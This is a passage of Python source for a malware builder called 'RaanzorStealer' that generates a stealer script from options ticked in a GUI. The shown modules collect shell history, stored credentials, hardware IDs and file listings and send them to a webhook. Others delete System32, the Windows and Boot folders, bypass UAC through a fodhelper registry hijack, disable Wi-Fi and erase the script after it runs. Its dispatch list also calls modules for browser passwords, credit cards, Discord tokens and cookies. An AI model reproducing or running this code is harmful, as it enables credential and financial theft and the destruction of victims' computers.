        os.path.join(os.environ["USERPROFILE"], "Music"),
        os.path.join(os.environ["USERPROFILE"], "Videos")
    ]
    for path in common_paths:
        if os.path.exists(path):
            common_files.extend(os.listdir(path)[:10])
    return "\\n".join(common_files)

def send_common_files():
    files = get_common_files()
    send_embed("Common Files", [{"name": "Common Files", "value": files, "inline": False}])
""")

        if "TskMgr Info" in options:
            script_parts.append("""
def get_tskmgr_info():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}")
        send_embed("📊 Task Manager Info", [{"name": "Processes", "value": '\\n'.join(processes), "inline": False}])
    except Exception as e:
        print(f"Error getting task manager info: {e}")

def take_tskmgr_screenshot():
    try:
        subprocess.run(["taskmgr"])
        pyautogui.sleep(2)
        screenshot = pyautogui.screenshot(region=(0, 0, 800, 600))
        screenshot.save("tskmgr_screenshot.png")
        send_file("tskmgr_screenshot.png", "📸 Task Manager Screenshot")
    except Exception as e:
        print(f"Error taking task manager screenshot: {e}")
""")

        if "Shell History" in options:
            script_parts.append("""
def get_shell_history():
    try:
        history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        if os.path.exists(history_path):
            with open(history_path, "r", encoding="utf-8") as f:
                history = f.read()
            send_embed("📜 Shell History", [{"name": "History", "value": history, "inline": False}])
    except Exception as e:
        print(f"Error getting shell history: {e}")
""")

        if "IPConf" in options:
            script_parts.append("""
def get_ipconf():
    try:
        ipconf = subprocess.check_output(["ipconfig", "/all"], universal_newlines=True)
        send_embed("🌐 IP Configuration", [{"name": "IP Configuration", "value": ipconf, "inline": False}])
    except Exception as e:
        print(f"Error getting IP configuration: {e}")
""")

        if "HWID" in options:
            script_parts.append("""
def get_hwid():
    try:
        hwid = subprocess.check_output(['wmic', 'csproduct', 'get', 'UUID']).decode().split('\\n')[1].strip()
        send_embed("🔧 HWID", [{"name": "HWID", "value": hwid, "inline": False}])
    except Exception as e:
        print(f"Error getting HWID: {e}")
""")

        if "UUID" in options:
            script_parts.append("""
def get_uuid():
    try:
        uuid_val = str(uuid.uuid4())
        send_embed("🔧 UUID", [{"name": "UUID", "value": uuid_val, "inline": False}])
    except Exception as e:
        print(f"Error getting UUID: {e}")
""")

        if "Credentials" in options:
            script_parts.append("""
def get_credentials():
    try:
        credentials = subprocess.check_output(["cmdkey", "/list"], universal_newlines=True)
        send_embed("🔑 Credentials", [{"name": "Credentials", "value": credentials, "inline": False}])
    except Exception as e:
        print(f"Error getting credentials: {e}")
""")

        if "Games" in options:
            script_parts.append("""
def get_installed_games():
    try:
        games = []
        common_paths = [
            os.path.join(os.environ["ProgramFiles"], "Steam"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Steam"),
            os.path.join(os.environ["ProgramFiles"], "Epic Games"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Epic Games"),
            os.path.join(os.environ["ProgramFiles"], "Origin"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Origin"),
            os.path.join(os.environ["ProgramFiles"], "Ubisoft"),
            os.path.join(os.environ["ProgramFiles(x86)"], "Ubisoft")
        ]
        for path in common_paths:
            if os.path.exists(path):
                games.extend(os.listdir(path))
        send_embed("🎮 Installed Games", [{"name": "Games", "value": "\\n".join(games), "inline": False}])
    except Exception as e:
        print(f"Error getting installed games: {e}")
""")

        if "System32 Deleter" in options:
            script_parts.append("""
def delete_system32():
    try:
        system32_path = os.path.join(os.environ["WINDIR"], "System32")
        shutil.rmtree(system32_path)
        send_embed("🗑️ System32 Deleted", [{"name": "Status", "value": "System32 directory deleted", "inline": False}])
    except Exception as e:
        print(f"Error deleting System32: {e}")
""")

        if "Windows Deleter" in options:
            script_parts.append("""
def delete_windows():
    try:
        windows_path = os.environ["WINDIR"]
        shutil.rmtree(windows_path)
        send_embed("🗑️ Windows Deleted", [{"name": "Status", "value": "Windows directory deleted", "inline": False}])
    except Exception as e:
        print(f"Error deleting Windows: {e}")
""")

        if "BootLoader Deleter" in options:
            script_parts.append("""
def delete_bootloader():
    try:
        bootloader_path = os.path.join(os.environ["WINDIR"], "Boot")
        shutil.rmtree(bootloader_path)
        send_embed("🗑️ BootLoader Deleted", [{"name": "Status", "value": "BootLoader directory deleted", "inline": False}])
    except Exception as e:
        print(f"Error deleting BootLoader: {e}")
""")

        if "UAC Bypass" in options:
            script_parts.append("""
def uac_bypass():
    try:
        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/ve", "/d", "cmd /k start", "/f"], check=True)
        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"], check=True)
        subprocess.run(["fodhelper.exe"], check=True)
        send_embed("🔓 UAC Bypass", [{"name": "Status", "value": "UAC Bypass executed", "inline": False}])
    except Exception as e:
        print(f"Error executing UAC Bypass: {e}")
""")

        if "Network Disruption" in options:
            script_parts.append("""
def network_disruption():
    try:
        subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "admin=disable"], check=True)
        send_embed("📶 Network Disruption", [{"name": "Status", "value": "Wi-Fi disabled", "inline": False}])
    except Exception as e:
        print(f"Error disabling Wi-Fi: {e}")
""")

        if "Automated File Deleter" in options:
            script_parts.append("""
def automated_file_deleter():
    try:
        file_path = os.path.abspath(__file__)
        os.remove(file_path)
        send_embed("🗑️ Automated File Deleter", [{"name": "Status", "value": "File deleted", "inline": False}])
    except Exception as e:
        print(f"Error deleting file: {e}")
""")

        script_parts.append("""
if __name__ == "__main__":
    if not is_admin():
        request_admin()
        sys.exit()
""")

        for option in options:
            if option == "System Info":
                script_parts.append("    get_system_info()\n")
            elif option == "IP Info":
                script_parts.append("    get_ip_info()\n")
            elif option == "Browsers List":
                script_parts.append("    get_browsers_list()\n")
            elif option == "Antivirus List":
                script_parts.append("    get_antivirus_list()\n")
            elif option == "Downloads List":
                script_parts.append("    get_downloads_list()\n")
            elif option == "Files on Desktop":
                script_parts.append("    get_desktop_files()\n")
            elif option == "Screenshot":
                script_parts.append("    take_screenshot()\n")
            elif option == "Webcam Screen":
                script_parts.append("    take_webcam_photo()\n")
            elif option == "Wi-Fi SSID":
                script_parts.append("    send_wifi_ssid()\n")
            elif option == "Kill All Programs":
                script_parts.append("    kill_all_programs()\n")
            elif option == "Kill Discord Client":
                script_parts.append("    kill_discord()\n")
            elif option == "Shutdown":
                script_parts.append("    shutdown()\n")
            elif option == "Fake Error":
                script_parts.append("    fake_error()\n")
            elif option == "Disconnect User":
                script_parts.append("    disconnect_user()\n")
            elif option == "Browsers Passwords":
                script_parts.append("    get_browsers_passwords()\n")
            elif option == "Credit Cards":
                script_parts.append("    get_credit_cards()\n")
            elif option == "Discord Token":
                script_parts.append("    get_discord_info()\n")
            elif option == "History":
                script_parts.append("    send_history()\n")
            elif option == "Cookies":
                script_parts.append("    send_cookies()\n")
            elif option == "Common Files":
                script_parts.append("    send_common_files()\n")
            elif option == "TskMgr Info":
                script_parts.append("    get_tskmgr_info()\n")
                script_parts.append("    take_tskmgr_screenshot()\n")
            elif option == "Shell History":
                script_parts.append("    get_shell_history()\n")
            elif option == "IPConf":
                script_parts.append("    get_ipconf()\n")
            elif option == "HWID":
                script_parts.append("    get_hwid()\n")
            elif option == "UUID":
                script_parts.append("    get_uuid()\n")
            elif option == "Credentials":
                script_parts.append("    get_credentials()\n")
            elif option == "Games":
                script_parts.append("    get_installed_games()\n")
            elif option == "Discord Info":
                script_parts.append("    get_discord_info()\n")
            elif option == "System32 Deleter":
                script_parts.append("    delete_system32()\n")
            elif option == "Windows Deleter":
                script_parts.append("    delete_windows()\n")
            elif option == "BootLoader Deleter":
                script_parts.append("    delete_bootloader()\n")
            elif option == "UAC Bypass":
                script_parts.append("    uac_bypass()\n")
            elif option == "Network Disruption":
                script_parts.append("    network_disruption()\n")
            elif option == "Automated File Deleter":
                script_parts.append("    automated_file_deleter()\n")

        return ''.join(script_parts)

    def show_message(self, message):
        messagebox.showinfo("Info", message)

if __name__ == "__main__":
    app = RaanzorStealer()
    app.mainloop()
